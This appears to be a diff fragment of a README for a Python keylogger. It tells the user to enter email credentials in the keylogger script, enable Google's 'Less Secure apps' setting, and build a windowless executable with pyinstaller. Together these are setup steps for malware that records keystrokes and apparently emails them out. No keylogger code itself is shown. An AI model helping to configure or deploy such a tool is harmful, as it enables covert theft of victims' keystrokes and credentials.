@@ -15,7 +15,7 @@ $ pip install -r requirements.txt
 
 - apply the Email and passowrd changes in `keylogger.py` and save.
 
-- Build the exe with
+<b>NOTE: You may need to enable allowing [Less Secure apps](https://myaccount.google.com/lesssecureapps) from your google account.
 
 ```sh
 $ pyinstaller main.py -w
